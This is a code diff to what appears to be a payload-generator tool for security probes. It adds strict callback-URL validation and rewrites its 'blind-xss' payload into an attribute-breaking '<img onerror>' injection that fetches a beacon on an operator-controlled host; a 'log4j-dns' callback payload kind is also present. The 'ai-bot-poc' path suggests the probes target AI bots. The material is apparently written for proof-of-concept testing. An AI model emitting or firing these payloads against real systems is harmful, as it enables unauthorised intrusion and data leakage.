@@ -31,11 +31,23 @@ def _validated_targets(values: list[str]) -> list[str]:
     return list(dict.fromkeys(targets))
 
 
+def _callback_url(callback: str) -> str:
+    parsed = urlsplit(callback if "://" in callback else f"https://{callback}")
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        raise ValueError("--callback must be an HTTP(S) URL or hostname")
+    if (parsed.username or parsed.password or parsed.query or parsed.fragment
+            or parsed.path not in ("", "/")):
+        raise ValueError("--callback must contain only a controlled host and optional port")
+    try:
+        port = parsed.port
+    except ValueError as exc:
+        raise ValueError("--callback contains an invalid port") from exc
+    host = f"[{parsed.hostname}]" if ":" in parsed.hostname else parsed.hostname
+    return f"{parsed.scheme}://{host}{f':{port}' if port else ''}"
+
+
 def _callback_host(callback: str) -> str:
-    parsed = urlsplit(callback if "://" in callback else f"//{callback}")
-    if not parsed.hostname:
-        raise ValueError("--callback must contain a hostname")
-    return parsed.hostname
+    return urlsplit(_callback_url(callback)).hostname or ""
 
 
 def make_payload(kind: str, *, n: int, target: str, token: str,
@@ -47,10 +59,9 @@ def make_payload(kind: str, *, n: int, target: str, token: str,
     if kind == "blind-xss":
         if not callback:
             raise ValueError("blind-xss requires --callback")
-        base = callback.rstrip("/")
-        if urlsplit(base).scheme not in ("http", "https"):
-            raise ValueError("blind-xss callback must be an absolute HTTP(S) URL")
-        return f'<img src="{base}/ai-bot-poc/{token}/{n}" alt="">'
+        beacon = f"{_callback_url(callback)}/ai-bot-poc/{quote(token, safe='')}/{n}"
+        return (f'''"><img src=x onerror="this.onerror=null;'''
+                f'''fetch('{beacon}',{{mode:'no-cors'}})">''')
     if kind == "log4j-dns":
         if not callback:
             raise ValueError("log4j-dns requires --callback")
